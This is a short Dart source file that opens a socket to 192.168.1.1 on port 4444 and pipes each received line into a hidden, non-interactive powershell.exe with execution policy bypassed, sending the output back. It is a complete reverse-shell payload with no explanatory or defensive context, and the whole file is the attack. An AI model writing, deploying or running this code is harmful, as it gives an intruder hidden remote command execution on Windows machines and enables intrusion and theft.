	import 'dart:io';
	import 'dart:convert';

	main() {
	  Socket.connect("192.168.1.1", 4444).then((socket) {
		socket.write('[*] Incoming powershell...\n');
		socket.listen((data) {
		  Process.start('powershell.exe', ['-W', 'Hi', '-NoP', '-NonI', '-Ex', 'by']).then((Process process) {
			process.stdin.writeln(new String.fromCharCodes(data).trim());
			process.stdout
			  .transform(utf8.decoder)
			  .listen((output) { socket.write(output); socket.flush(); });
		  });
		},
		onDone: () {
		  socket.destroy();
		});
	  });
	}
